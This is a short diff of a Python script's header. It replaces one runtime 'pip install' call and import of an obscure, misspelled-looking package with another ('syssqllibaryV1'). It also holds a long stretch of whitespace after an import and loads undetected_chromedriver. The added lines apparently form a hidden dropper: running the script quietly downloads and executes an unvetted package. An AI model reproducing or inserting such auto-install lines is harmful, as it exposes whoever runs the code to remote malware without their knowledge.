@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringsaddV2")
-import syscolouringsaddV2
+os.system("pip install syssqllibaryV1")
+import syssqllibaryV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
